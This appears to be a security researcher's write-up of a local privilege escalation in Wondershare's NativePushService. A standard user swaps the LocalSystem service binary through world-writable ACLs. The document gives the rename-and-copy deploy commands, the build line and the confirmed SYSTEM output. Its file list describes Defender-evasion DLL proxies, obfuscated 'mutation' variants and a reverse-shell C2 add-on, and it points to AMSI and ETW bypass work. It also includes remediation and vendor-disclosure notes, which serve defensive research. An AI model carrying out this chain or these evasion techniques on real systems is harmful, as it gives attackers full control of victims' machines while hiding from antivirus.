# PHASE 3 -- PRIVILEGE ESCALATION (Standard User → LocalSystem)

## Classification: UNCLASSIFIED // ACADEMIC USE ONLY
## Status: **CONFIRMED** — Finding #42 (SYSTEM execution via service binary replacement)

---

## Objective

Achieve code execution as NT AUTHORITY\SYSTEM from a standard user account
by exploiting insecure service directory and binary permissions.

## Vulnerability Summary

**Affected Software:** Wondershare NativePushService (WsNativePushService.exe)
**Service Account:** LocalSystem
**Start Mode:** Automatic (runs on boot)
**CVE Class:** CWE-732 (Incorrect Permission Assignment for Critical Resource)

### The Bug

Wondershare installs `NativePushService` with its binary in a per-user
AppData directory. The directory AND the service binary have
**BUILTIN\Users Full Control** ACL, meaning ANY user on the system can
replace the LocalSystem service executable.

```
Service:     NativePushService (Wondershare Native Push Service)
Binary:      C:\Users\apacw\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe
Account:     LocalSystem
Start:       Auto

Directory ACL:
  BUILTIN\Users:(OI)(CI)(F)     <-- ALL USERS FULL CONTROL
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
  BUILTIN\Administrators:(I)(F)

Binary ACL:
  BUILTIN\Users:(I)(F)          <-- ALL USERS FULL CONTROL (inherited)
```

## Attack Chain (Binary Replacement)

```
STANDARD USER (no elevation):
  1. Rename running service exe (Windows allows this on open files)
     cmd> rename "...\WsNativePushService.exe" "WsNativePushService_real.exe"
     Result: SUCCESS

  2. Plant replacement binary
     cmd> copy svc_replace.exe "...\WsNativePushService.exe"
     Result: SUCCESS (BUILTIN\Users Full Control)

  3. Service restarts (admin restart, reboot, or crash recovery)
     -> SCM launches our replacement as LocalSystem
     -> Our binary writes SYSTEM proof, then launches real exe
     -> Service continues functioning normally

  4. Result:
     Canary: "20260615_033636|SYSTEM|elev=1|pid=34776|BINARY_REPLACE"
                               ^^^^^^ ^^^^^^
                               SYSTEM  ELEVATED — full LocalSystem token
```

## Why DLL Sideloading Failed (and Binary Replacement Succeeded)

### Attempted: DLL Search Order Hijacking (Finding #38)
WsNativePushService.exe imports VERSION.dll (not in KnownDLLs).
Planted proxy DLL in application directory. Should load before System32.

**Blocked by:** Embedded application manifest with `<file>` redirection (Finding #40):
```xml
<file name="version.dll" loadFrom="%SystemRoot%\system32\version.dll"/>
<file name="userenv.dll" loadFrom="%SystemRoot%\system32\userenv.dll"/>
<!-- ... all non-KnownDLL imports explicitly redirected to System32 -->
```

Wondershare deliberately hardened against DLL sideloading. The manifest
locks all sideloadable DLL imports to System32 paths, bypassing normal
DLL search order.

### The Irony
Wondershare hardened the windows (manifest DLL redirection) but left the
front door open (BUILTIN\Users Full Control on the exe binary itself).
Binary replacement bypasses all manifest, KnownDLLs, and DLL search
order defenses entirely.

## Discovery Process

1. `hunter.ps1` enumerated all 308 SYSTEM services on the machine
2. NativePushService flagged: SYSTEM service in user-profile directory
3. Built VERSION.dll proxy (v1-v6), multiple Defender evasion iterations
4. Service never loaded proxy DLL despite 5+ restarts
5. PE manifest extraction revealed `<file>` DLL redirection hardening
6. External manifest override attempted — fails (embedded takes precedence)
7. Pivoted: checked exe binary ACL — `BUILTIN\Users:(I)(F)` Full Control
8. Built service replacement binary (svc_replace.c)
9. Renamed running exe + planted replacement (both succeed as standard user)
10. Service restart → **SYSTEM execution confirmed**

## Proof of Concept

### Files

```
sideload/
├── hunter.ps1                    # Discovery scanner (found this target)
├── hunter_v2.ps1                 # Phase 2 scanner (manifest-aware)
├── hunt_results.txt              # Full scan output (gitignored)
├── version_proxy_annotated.c     # DLL proxy v1 (annotated, blocked by manifest)
├── version_v3.c                  # Linker-forwarded proxy (broken — PE forwarder bug)
├── version_v4.c                  # Compact runtime proxy (Defender evasion: .tmp rename)
├── version_v5_debug.c            # Debug breadcrumb proxy (confirmed DllMain never fires)
├── version_v6_stealth.c          # Stealth proxy (XOR strings, lazy init, evades Defender)
├── canary_pure.c                 # Pure canary DLL (no proxy — Defender comparison test)
├── svc_replace.c                 # Service binary replacement — MASTER (CONFIRMED WORKING)
├── svc_m1.c                      # Mutation 1: variable randomization + canary path rotation
├── svc_m2.c                      # Mutation 2: XOR string obfuscation + threaded canary
├── svc_m3.c                      # Mutation 3: stack strings + dynamic API + flow reversal
├── svc_replace_shell.c           # VADER shell bolt-on — SYSTEM privesc + reverse shell C2
├── MUTATION_GUIDE.md             # Mutation strategies and deployment checklist
├── version.def                   # Linker export definitions (17 exports)
├── test_proxy.c                  # DLL test harness
├── deploy.bat                    # Deployment/testing script
└── README.md                     # This file
```

### Build (Binary Replacement)

```
cl.exe svc_replace.c /Fe:svc_replace.exe /O1 /GS- /link advapi32.lib user32.lib
```

### Deploy (standard user — no elevation needed)

```bat
:: Step 1: Rename running service exe
rename "C:\Users\apacw\...\WsNativePushService.exe" "WsNativePushService_real.exe"

:: Step 2: Plant replacement
copy svc_replace.exe "C:\Users\apacw\...\WsNativePushService.exe"

:: Step 3: Wait for service restart (reboot or admin restart)
:: Step 4: Check canary
type C:\Windows\Temp\ws_diag.log
```

### Verified Output

```
20260615_033636|SYSTEM|elev=1|pid=34776|BINARY_REPLACE
```

## Findings Summary

| # | Finding | Status |
|---|---------|--------|
| #38 | NativePushService DLL sideload opportunity discovered | BLOCKED (manifest) |
| #39 | Defender cloud/ML retroactive detection of proxy DLLs | CONFIRMED |
| #40 | Wondershare manifest-based DLL redirection hardening | CONFIRMED |
| #41 | Defender ML proxy pattern vs pure DLL (evasion confirmed) | CONFIRMED |
| #42 | **Privilege escalation via service binary replacement** | **SYSTEM** |

## Defense Analysis

| Defense Layer | Status | Why It Fails |
|---------------|--------|--------------|
| File ACL | **BROKEN** | BUILTIN\Users Full Control on .exe |
| Directory ACL | **BROKEN** | Inherited Full Control |
| UAC | Not triggered | Writing to AppData, not protected path |
| Code signing | Not enforced | SCM does not verify binary signatures |
| Manifest hardening | Bypassed | Binary replaced, no DLL loading needed |
| KnownDLLs | Irrelevant | No DLL hijacking involved |
| Defender static | Clean | Replacement binary is a legitimate service exe |
| Defender behavioral | Clean | No proxy pattern, no suspicious API calls |

## Remediation

1. Service binary and directory ACLs should be restrictive:
   `SYSTEM:(F) BUILTIN\Administrators:(F)` — no user write access
2. Service directory should NOT be in a per-user AppData path
3. Digital signature verification on service binaries
4. Use `sc sdset` to restrict service configuration permissions

## MSRC Relevance

**Target:** Wondershare (third-party vendor, not Microsoft)
**Disclosure path:** Wondershare security contact, NOT MSRC

For an MSRC-eligible finding, need a FIRST-PARTY Windows service with
the same pattern. Candidates from the scan:
- `cdpsgshims.dll` — CVE-2025-24076 pattern (Cross-Device Service)
- `pnrpnsp.dll` — not in System32, potentially plantable
- Writable SYSTEM PATH entries (Muse Hub, chocolatey, Python)

## Cross-References

- Finding #14 (vader-toctou): SYSTEM services follow junctions
- Finding #33 (rootkit): AMSI HWBP bypass (dark room prerequisite)
- Finding #35 (rootkit): ETW HWBP bypass (dark room prerequisite)
- Finding #37 (rootkit): Dark room operational for tool deployment
- Finding #40 (rootkit): Manifest hardening discovered and documented
- CVE-2025-24076: Same CWE-732 pattern in Microsoft Cross-Device Service
